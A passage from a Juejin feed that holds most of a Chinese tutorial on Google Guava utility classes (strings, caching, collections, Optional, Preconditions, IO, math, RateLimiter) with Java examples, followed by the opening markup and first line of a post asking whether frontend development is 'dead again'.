Map&lt;String, Integer&gt; column = table.column(<span class="hljs-string">"Q1"</span>);  <span class="hljs-comment">// {2023=100, 2024=120}</span>
</code></pre>
<h2 data-id="heading-7">2. 字符串工具 (Strings)</h2>
<h3 data-id="heading-8">2.1 Joiner - 连接器</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 基本连接</span>
<span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> Joiner.on(<span class="hljs-string">", "</span>).join(Arrays.asList(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>));
<span class="hljs-comment">// 输出: A, B, C</span>

<span class="hljs-comment">// 跳过 null 值</span>
<span class="hljs-type">String</span> <span class="hljs-variable">withoutNull</span> <span class="hljs-operator">=</span> Joiner.on(<span class="hljs-string">", "</span>)
    .skipNulls()
    .join(<span class="hljs-string">"A"</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);
<span class="hljs-comment">// 输出: A, B, C</span>

<span class="hljs-comment">// 替换 null 值</span>
<span class="hljs-type">String</span> <span class="hljs-variable">replaceNull</span> <span class="hljs-operator">=</span> Joiner.on(<span class="hljs-string">", "</span>)
    .useForNull(<span class="hljs-string">"N/A"</span>)
    .join(<span class="hljs-string">"A"</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">"B"</span>);
<span class="hljs-comment">// 输出: A, N/A, B</span>

<span class="hljs-comment">// Map 连接</span>
Map&lt;String, String&gt; map = ImmutableMap.of(<span class="hljs-string">"name"</span>, <span class="hljs-string">"John"</span>, <span class="hljs-string">"age"</span>, <span class="hljs-string">"30"</span>);
<span class="hljs-type">String</span> <span class="hljs-variable">mapStr</span> <span class="hljs-operator">=</span> Joiner.on(<span class="hljs-string">"&amp;"</span>).withKeyValueSeparator(<span class="hljs-string">"="</span>).join(map);
<span class="hljs-comment">// 输出: name=John&amp;age=30</span>
</code></pre>
<h3 data-id="heading-9">2.2 Splitter - 分割器</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 基本分割</span>
Iterable&lt;String&gt; parts = Splitter.on(<span class="hljs-string">','</span>).split(<span class="hljs-string">"A,B,C"</span>);

<span class="hljs-comment">// 去除空白字符</span>
Iterable&lt;String&gt; trimmed = Splitter.on(<span class="hljs-string">','</span>)
    .trimResults()
    .split(<span class="hljs-string">" A , B , C "</span>);

<span class="hljs-comment">// 忽略空字符串</span>
Iterable&lt;String&gt; noEmpty = Splitter.on(<span class="hljs-string">','</span>)
    .omitEmptyStrings()
    .split(<span class="hljs-string">"A,,B,C"</span>);

<span class="hljs-comment">// 限制分割数量</span>
Iterable&lt;String&gt; limited = Splitter.on(<span class="hljs-string">','</span>)
    .limit(<span class="hljs-number">2</span>)
    .split(<span class="hljs-string">"A,B,C,D"</span>);
<span class="hljs-comment">// 结果: [A, B,C,D]</span>

<span class="hljs-comment">// 分割 Map</span>
Map&lt;String, String&gt; kvMap = Splitter.on(<span class="hljs-string">'&amp;'</span>)
    .withKeyValueSeparator(<span class="hljs-string">'='</span>)
    .split(<span class="hljs-string">"name=John&amp;age=30"</span>);
</code></pre>
<h3 data-id="heading-10">2.3 Strings 工具类</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// null 转空字符串</span>
<span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> Strings.nullToEmpty(<span class="hljs-literal">null</span>);  <span class="hljs-comment">// ""</span>

<span class="hljs-comment">// 空字符串转 null</span>
<span class="hljs-type">String</span> <span class="hljs-variable">nullStr</span> <span class="hljs-operator">=</span> Strings.emptyToNull(<span class="hljs-string">""</span>);  <span class="hljs-comment">// null</span>

<span class="hljs-comment">// 字符串填充</span>
<span class="hljs-type">String</span> <span class="hljs-variable">padded</span> <span class="hljs-operator">=</span> Strings.padStart(<span class="hljs-string">"7"</span>, <span class="hljs-number">3</span>, <span class="hljs-string">'0'</span>);  <span class="hljs-comment">// "007"</span>
<span class="hljs-type">String</span> <span class="hljs-variable">paddedEnd</span> <span class="hljs-operator">=</span> Strings.padEnd(<span class="hljs-string">"7"</span>, <span class="hljs-number">3</span>, <span class="hljs-string">'0'</span>); <span class="hljs-comment">// "700"</span>

<span class="hljs-comment">// 重复字符串</span>
<span class="hljs-type">String</span> <span class="hljs-variable">repeated</span> <span class="hljs-operator">=</span> Strings.repeat(<span class="hljs-string">"ab"</span>, <span class="hljs-number">3</span>);  <span class="hljs-comment">// "ababab"</span>

<span class="hljs-comment">// 公共前缀</span>
<span class="hljs-type">String</span> <span class="hljs-variable">prefix</span> <span class="hljs-operator">=</span> Strings.commonPrefix(<span class="hljs-string">"testing"</span>, <span class="hljs-string">"test"</span>);  <span class="hljs-comment">// "test"</span>

<span class="hljs-comment">// 公共后缀</span>
<span class="hljs-type">String</span> <span class="hljs-variable">suffix</span> <span class="hljs-operator">=</span> Strings.commonSuffix(<span class="hljs-string">"testing"</span>, <span class="hljs-string">"interesting"</span>);  <span class="hljs-comment">// "ting"</span>
</code></pre>
<h2 data-id="heading-11">3. 缓存工具 (Cache)</h2>
<p>Guava Cache 提供本地缓存功能，支持多种过期策略。</p>
<pre><code class="hljs language-java" lang="java">LoadingCache&lt;String, String&gt; cache = CacheBuilder.newBuilder()
    .maximumSize(<span class="hljs-number">1000</span>)                          <span class="hljs-comment">// 最大容量</span>
    .expireAfterWrite(<span class="hljs-number">10</span>, TimeUnit.MINUTES)    <span class="hljs-comment">// 写入后过期</span>
    .expireAfterAccess(<span class="hljs-number">5</span>, TimeUnit.MINUTES)    <span class="hljs-comment">// 访问后过期</span>
    .recordStats()                              <span class="hljs-comment">// 启用统计</span>
    .build(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheLoader</span>&lt;String, String&gt;() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">load</span><span class="hljs-params">(String key)</span> <span class="hljs-keyword">throws</span> Exception {
            <span class="hljs-keyword">return</span> loadFromDatabase(key);  <span class="hljs-comment">// 缓存加载逻辑</span>
        }
    });

<span class="hljs-comment">// 使用缓存</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> cache.get(<span class="hljs-string">"key"</span>);
} <span class="hljs-keyword">catch</span> (ExecutionException e) {
    e.printStackTrace();
}

<span class="hljs-comment">// 手动放入</span>
cache.put(<span class="hljs-string">"key"</span>, <span class="hljs-string">"value"</span>);

<span class="hljs-comment">// 失效缓存</span>
cache.invalidate(<span class="hljs-string">"key"</span>);

<span class="hljs-comment">// 查看统计</span>
<span class="hljs-type">CacheStats</span> <span class="hljs-variable">stats</span> <span class="hljs-operator">=</span> cache.stats();
System.out.println(<span class="hljs-string">"命中率: "</span> + stats.hitRate());
</code></pre>
<h2 data-id="heading-12">4. 集合工具类 (Lists, Sets, Maps)</h2>
<h3 data-id="heading-13">4.1 Lists 工具</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建 ArrayList</span>
List&lt;String&gt; list = Lists.newArrayList(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);

<span class="hljs-comment">// 指定容量</span>
List&lt;String&gt; capacityList = Lists.newArrayListWithCapacity(<span class="hljs-number">100</span>);

<span class="hljs-comment">// 反转列表</span>
List&lt;String&gt; reversed = Lists.reverse(list);

<span class="hljs-comment">// 分区</span>
List&lt;List&lt;String&gt;&gt; partitions = Lists.partition(list, <span class="hljs-number">2</span>);
<span class="hljs-comment">// 结果: [[A, B], [C]]</span>

<span class="hljs-comment">// 笛卡尔积</span>
List&lt;List&lt;String&gt;&gt; cartesian = Lists.cartesianProduct(
    Lists.newArrayList(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>),
    Lists.newArrayList(<span class="hljs-string">"1"</span>, <span class="hljs-string">"2"</span>)
);
<span class="hljs-comment">// 结果: [[A, 1], [A, 2], [B, 1], [B, 2]]</span>
</code></pre>
<h3 data-id="heading-14">4.2 Sets 工具</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建 HashSet</span>
Set&lt;String&gt; set1 = Sets.newHashSet(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);
Set&lt;String&gt; set2 = Sets.newHashSet(<span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>, <span class="hljs-string">"D"</span>);

<span class="hljs-comment">// 并集</span>
Set&lt;String&gt; union = Sets.union(set1, set2);  <span class="hljs-comment">// [A, B, C, D]</span>

<span class="hljs-comment">// 交集</span>
Set&lt;String&gt; intersection = Sets.intersection(set1, set2);  <span class="hljs-comment">// [B, C]</span>

<span class="hljs-comment">// 差集</span>
Set&lt;String&gt; difference = Sets.difference(set1, set2);  <span class="hljs-comment">// [A]</span>

<span class="hljs-comment">// 对称差集</span>
Set&lt;String&gt; symmetricDifference = Sets.symmetricDifference(set1, set2);  <span class="hljs-comment">// [A, D]</span>

<span class="hljs-comment">// 幂集</span>
Set&lt;Set&lt;String&gt;&gt; powerSet = Sets.powerSet(Sets.newHashSet(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>));
<span class="hljs-comment">// 结果: [[], [A], [B], [A, B]]</span>
</code></pre>
<h3 data-id="heading-15">4.3 Maps 工具</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建 HashMap</span>
Map&lt;String, Integer&gt; map = Maps.newHashMap();

<span class="hljs-comment">// 从 Set 创建 Map</span>
Set&lt;String&gt; keys = Sets.newHashSet(<span class="hljs-string">"A"</span>, <span class="hljs-string">"B"</span>, <span class="hljs-string">"C"</span>);
Map&lt;String, String&gt; mapFromKeys = Maps.asMap(keys, key -&gt; key.toLowerCase());

<span class="hljs-comment">// 过滤 Map</span>
Map&lt;String, Integer&gt; filtered = Maps.filterKeys(map, key -&gt; key.startsWith(<span class="hljs-string">"A"</span>));

<span class="hljs-comment">// 转换 Map 值</span>
Map&lt;String, String&gt; transformed = Maps.transformValues(map, value -&gt; <span class="hljs-string">"Value: "</span> + value);

<span class="hljs-comment">// 差异比较</span>
MapDifference&lt;String, Integer&gt; diff = Maps.difference(map1, map2);
System.out.println(<span class="hljs-string">"仅在左侧: "</span> + diff.entriesOnlyOnLeft());
System.out.println(<span class="hljs-string">"仅在右侧: "</span> + diff.entriesOnlyOnRight());
System.out.println(<span class="hljs-string">"值不同: "</span> + diff.entriesDiffering());
</code></pre>
<h2 data-id="heading-16">5. Optional - 避免空指针</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建 Optional</span>
Optional&lt;String&gt; optional = Optional.of(<span class="hljs-string">"Hello"</span>);
Optional&lt;String&gt; nullable = Optional.fromNullable(<span class="hljs-literal">null</span>);
Optional&lt;String&gt; absent = Optional.absent();

<span class="hljs-comment">// 判断是否存在</span>
<span class="hljs-keyword">if</span> (optional.isPresent()) {
    System.out.println(optional.get());
}

<span class="hljs-comment">// 提供默认值</span>
<span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> nullable.or(<span class="hljs-string">"Default"</span>);

<span class="hljs-comment">// 转换</span>
Optional&lt;Integer&gt; length = optional.transform(String::length);

<span class="hljs-comment">// 与 Java 8 Optional 互转</span>
java.util.Optional&lt;String&gt; javaOptional = optional.toJavaUtil();
Optional&lt;String&gt; guavaOptional = Optional.fromJavaUtil(javaOptional);
</code></pre>
<h2 data-id="heading-17">6. Preconditions - 前置条件检查</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processUser</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age, List&lt;String&gt; roles)</span> {
    <span class="hljs-comment">// 检查非 null</span>
    Preconditions.checkNotNull(name, <span class="hljs-string">"姓名不能为空"</span>);
    
    <span class="hljs-comment">// 检查参数条件</span>
    Preconditions.checkArgument(age &gt;= <span class="hljs-number">0</span> &amp;&amp; age &lt;= <span class="hljs-number">150</span>, 
        <span class="hljs-string">"年龄必须在 0-150 之间，实际值: %s"</span>, age);
    
    <span class="hljs-comment">// 检查状态</span>
    Preconditions.checkState(isInitialized, <span class="hljs-string">"服务未初始化"</span>);
    
    <span class="hljs-comment">// 检查索引</span>
    Preconditions.checkElementIndex(<span class="hljs-number">0</span>, roles.size(), <span class="hljs-string">"角色列表"</span>);
    
    <span class="hljs-comment">// 检查位置索引</span>
    Preconditions.checkPositionIndex(<span class="hljs-number">1</span>, roles.size(), <span class="hljs-string">"角色列表"</span>);
}
</code></pre>
<h2 data-id="heading-18">7. Objects 工具</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 空值判断</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">isNull</span> <span class="hljs-operator">=</span> Objects.equal(<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);  <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 哈希码</span>
<span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> Objects.hashCode(obj1, obj2, obj3);

<span class="hljs-comment">// toString 辅助</span>
<span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> MoreObjects.toStringHelper(<span class="hljs-built_in">this</span>)
    .add(<span class="hljs-string">"name"</span>, name)
    .add(<span class="hljs-string">"age"</span>, age)
    .toString();
<span class="hljs-comment">// 输出: ClassName{name=John, age=30}</span>

<span class="hljs-comment">// 比较链</span>
<span class="hljs-type">int</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> ComparisonChain.start()
    .compare(<span class="hljs-built_in">this</span>.name, other.name)
    .compare(<span class="hljs-built_in">this</span>.age, other.age)
    .result();
</code></pre>
<h2 data-id="heading-19">8. IO 工具</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 读取文件</span>
<span class="hljs-type">String</span> <span class="hljs-variable">content</span> <span class="hljs-operator">=</span> Files.asCharSource(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">"test.txt"</span>), Charsets.UTF_8).read();

<span class="hljs-comment">// 写入文件</span>
Files.asCharSink(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">"output.txt"</span>), Charsets.UTF_8).write(<span class="hljs-string">"Hello World"</span>);

<span class="hljs-comment">// 复制文件</span>
Files.copy(sourceFile, targetFile);

<span class="hljs-comment">// 移动文件</span>
Files.move(sourceFile, targetFile);

<span class="hljs-comment">// 读取所有行</span>
List&lt;String&gt; lines = Files.readLines(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">"test.txt"</span>), Charsets.UTF_8);

<span class="hljs-comment">// 关闭流</span>
<span class="hljs-type">Closer</span> <span class="hljs-variable">closer</span> <span class="hljs-operator">=</span> Closer.create();
<span class="hljs-keyword">try</span> {
    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> closer.register(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">"file.txt"</span>));
    <span class="hljs-comment">// 使用流</span>
} <span class="hljs-keyword">catch</span> (Throwable e) {
    <span class="hljs-keyword">throw</span> closer.rethrow(e);
} <span class="hljs-keyword">finally</span> {
    closer.close();
}
</code></pre>
<h2 data-id="heading-20">9. 数学工具 (Math)</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 整数运算</span>
<span class="hljs-type">int</span> <span class="hljs-variable">gcd</span> <span class="hljs-operator">=</span> IntMath.gcd(<span class="hljs-number">12</span>, <span class="hljs-number">18</span>);  <span class="hljs-comment">// 最大公约数: 6</span>
<span class="hljs-type">int</span> <span class="hljs-variable">mod</span> <span class="hljs-operator">=</span> IntMath.mod(-<span class="hljs-number">5</span>, <span class="hljs-number">3</span>);   <span class="hljs-comment">// 模运算: 1</span>
<span class="hljs-type">int</span> <span class="hljs-variable">pow</span> <span class="hljs-operator">=</span> IntMath.pow(<span class="hljs-number">2</span>, <span class="hljs-number">10</span>);   <span class="hljs-comment">// 幂运算: 1024</span>

<span class="hljs-comment">// 判断是否为质数</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">isPrime</span> <span class="hljs-operator">=</span> IntMath.isPrime(<span class="hljs-number">17</span>);  <span class="hljs-comment">// true</span>

<span class="hljs-comment">// 阶乘</span>
<span class="hljs-type">int</span> <span class="hljs-variable">factorial</span> <span class="hljs-operator">=</span> IntMath.factorial(<span class="hljs-number">5</span>);  <span class="hljs-comment">// 120</span>

<span class="hljs-comment">// 二项式系数</span>
<span class="hljs-type">int</span> <span class="hljs-variable">binomial</span> <span class="hljs-operator">=</span> IntMath.binomial(<span class="hljs-number">5</span>, <span class="hljs-number">2</span>);  <span class="hljs-comment">// 10</span>

<span class="hljs-comment">// 浮点数比较</span>
<span class="hljs-type">boolean</span> <span class="hljs-variable">fuzzyEquals</span> <span class="hljs-operator">=</span> DoubleMath.fuzzyEquals(<span class="hljs-number">1.0</span>, <span class="hljs-number">1.0000001</span>, <span class="hljs-number">0.00001</span>);
</code></pre>
<h2 data-id="heading-21">10. RateLimiter - 限流器</h2>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 创建限流器：每秒 5 个许可</span>
<span class="hljs-type">RateLimiter</span> <span class="hljs-variable">limiter</span> <span class="hljs-operator">=</span> RateLimiter.create(<span class="hljs-number">5.0</span>);

<span class="hljs-comment">// 获取许可（阻塞）</span>
limiter.acquire();
processRequest();

<span class="hljs-comment">// 获取多个许可</span>
limiter.acquire(<span class="hljs-number">3</span>);

<span class="hljs-comment">// 尝试获取许可（非阻塞）</span>
<span class="hljs-keyword">if</span> (limiter.tryAcquire()) {
    processRequest();
} <span class="hljs-keyword">else</span> {
    rejectRequest();
}

<span class="hljs-comment">// 带超时的获取</span>
<span class="hljs-keyword">if</span> (limiter.tryAcquire(<span class="hljs-number">1</span>, TimeUnit.SECONDS)) {
    processRequest();
}
</code></pre>
<h2 data-id="heading-22">Maven 依赖</h2>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.google.guava<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>guava<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>32.1.3-jre<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h2 data-id="heading-23">总结</h2>
<p>Guava 提供了丰富的工具类，涵盖集合、字符串、缓存、IO 等多个方面，能够显著提升 Java 开发效率。建议在项目中合理使用这些工具，减少重复造轮子，提高代码质量和可维护性。</p>
<p>关键优势：</p>
<ul>
<li>线程安全的不可变集合</li>
<li>强大的集合扩展（Multimap、Table、BiMap）</li>
<li>简洁的字符串处理</li>
<li>高性能本地缓存</li>
<li>完善的前置条件检查</li>
<li>实用的限流和数学工具</li>
</ul>
<p>通过掌握这些常用工具包，你可以写出更加简洁、高效、健壮的 Java 代码。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[听说前端又死了？]]></title>    <link>https://juejin.cn/post/7575651989985820726</link>    <guid>https://juejin.cn/post/7575651989985820726</guid>    <pubDate>2025-11-24T02:40:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575651989985820726" data-draft-id="7575937594350010411" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="听说前端又死了？"/> <meta itemprop="keywords" content="前端,程序员,人工智能"/> <meta itemprop="datePublished" content="2025-11-24T02:40:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="suke"/> <meta itemprop="url" content="https://juejin.cn/user/404227777640397"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            听说前端又死了？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/404227777640397/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    suke
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T02:40:56.000Z" title="Mon Nov 24 2025 02:40:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这几天刷 X、刷 Reddit、刷国内技术社区，只要你稍微点开热榜，就会被同一句话精准爆头：</p>
